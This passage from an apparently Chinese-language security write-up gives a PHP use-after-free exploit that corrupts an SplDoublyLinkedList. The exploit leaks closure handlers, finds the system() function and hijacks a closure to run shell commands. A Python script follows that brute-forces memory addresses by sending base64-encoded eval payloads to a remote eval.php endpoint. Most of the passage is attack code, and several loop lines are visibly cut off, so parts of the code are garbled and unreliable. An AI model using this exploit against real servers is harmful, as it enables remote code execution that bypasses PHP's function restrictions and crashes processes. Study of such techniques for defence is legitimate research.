    function getSystem(&$a, $address) {
        $start = $address & 0xffffffffffff0000;
        $lowestAddr = ($address & 0x0000fffffff00000) - 0x0000000001000000;
        for($i = 0; $i  $address || $nameAddr  current();
            $s -> next();
            if ($s -> current() !== 0x1234567812345678) {
                 die("[!]UAF Failed");
            }
            $maps = file_get_contents("/proc/self/maps");
            if (!$maps) {
                cantRead($a);
            }else {
                canRead($maps, $a);
            }
            echo "[+]Done";
        }
    }
    function bypass($elementAddress, &$a) {
        global $s;
        if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) {
            die("[!]Get Closure Chunk Address Failed");
        }
        $closure_object = leak($a, $closureChunkAddress + 0x18);
        echo "[+]Closure Object: " . dechex($closure_object) . "\n";
        $closure_handlers = leak($a, $closure_object + 0x18);
        echo "[+]Closure Handler: " . dechex($closure_handlers) . "\n";
        if(!($system_address = getSystem($a, $closure_handlers))) {
            die("[!]Couldn't determine system address");
        }
        echo "[+]Find system's handler: " . dechex($system_address) . "\n";
        i2s($a, 0x08, 0x506, 7);
        for ($i = 0;$i  current(), 0x08 * $i + 0x100, $data);
        }
        i2s($a, 0x00, $closure_object + 0x30);
        i2s($s -> current(), 0x20, $system_address);
        i2s($a, 0x00, $closure_object);
        i2s($a, 0x08, 0x108, 7);
        echo "[+]Executing command: \n";
        ($s -> current())("php -v");
    }
    function canRead($maps, &$a) {
        global $s;
        if (!$chunkAddress = getPHPChunk($maps)) {
            die("[!]Get PHP Chunk Address Failed");
        }
        i2s($a, 0x08, 0x06, 7);
        if (!$elementAddress = getElement($a, $chunkAddress)) {
            die("[!]Get SplDoublyLinkedList Element Address Failed");
        }
        bypass($elementAddress, $a);
    }
    function cantRead(&$a) {
        global $s;
        i2s($a, 0x08, 0x06, 7);
        if (!isset($_GET["test1"]) && !isset($_GET["test2"])) {
            die("[!]Please try to get address of PHP Chunk");
        }
        if (isset($_GET["test1"])) {
            die(dechex(bomb1($a)));
        }
        if (isset($_GET["test2"])) {
            $elementAddress = bomb2($a);
        }
        if (!$elementAddress) {
            die("[!]Get SplDoublyLinkedList Element Address Failed");
        }
        bypass($elementAddress, $a);
    }
    $s = new SplDoublyLinkedList();
    $s -> push(new Trigger());
    $s -> push("Twings");
    $s -> push(function($x){});
    for ($x = 0;$x  push(0x1234567812345678);
    }
    $s -> rewind();
    unset($s[0]);
Python 部分比较简单，写好爆破部分就成，我写的很烂，师傅们看个大概就好：
    # -*- coding:utf8 -*-    import requests
    import base64
    import time
    import urllib
    from libnum import n2s
    def bomb1(_url):
        content = None
        count = 1
        addr = 0x7f0000000000  # change here and bomb1() in php if failed
        while True:
            try:
                addr = addr + 0x10000000 / 2
                if count % 100 == 0:
                    print "[+]Bomb " + str(count) + " times, address of first chunk maybe: " + str(hex(addr))
                content = requests.post(_url + "?test1=" + urllib.quote(n2s(addr)), data={
                    "c": "eval(base64_decode('" + payload + "'));",
                }).content
                if "[!]" in content or "502 Bad Gateway" in content:
                    count += 1
                    continue
                break
            except:
                count += 1
                continue
        return content
    def bomb2(_url, _addr1):
        content = None
        count = 1
        crashcount = 0
        while True:
            try:
                _addr1 = _addr1 + 0x200000
                if count % 10 == 0:
                    print "[+]Bomb " + str(count) + " times, address of php chunk maybe: " + str(hex(_addr1))
                content = requests.post(_url + "?test2=" + urllib.quote(n2s(_addr1)), data={
                    "c": "eval(base64_decode('" + payload + "'));",
                }).content
                if "[!]" in content or "502 Bad Gateway" in content:
                    count += 1
                    continue
                break
            except:
                count += 1
                crashcount += 1
                continue
        print "[+]PHP crash " + str(crashcount) + " times"
        return content
    payload = open("xxx.php").read()
    payload = base64.b64encode("?>" + payload)
    url = "http://x.x.x.x:x/eval.php"
    print "[+]Execute Payload, Output is:"
    content = requests.post(url, data={
        "c": "eval(base64_decode('" + payload + "'));",
    }).content
    if "[!]Please try to get address of PHP Chunk" in content:
        addr1 = bomb1(url)
        if addr1 is None:
            exit(1)
        print "---------------------------------------------------------------------------------"
        addr2 = bomb2(url, int(addr1, 16))
        if addr2 is None:
            exit(1)
        print "---------------------------------------------------------------------------------"
        print addr2
    else:
        print content
    print "[+]Execute Payload Over."
### 不足之处
就像上面所说的，限制了 openbase_dir 情况下的利用，需要进行爆破，而且还会导致进程崩溃。
由于本人水平限制，利用过程中可能存在各种各样的问题，如果各位师傅有更好的利用方式，欢迎指正与讨论。
* * *
Orz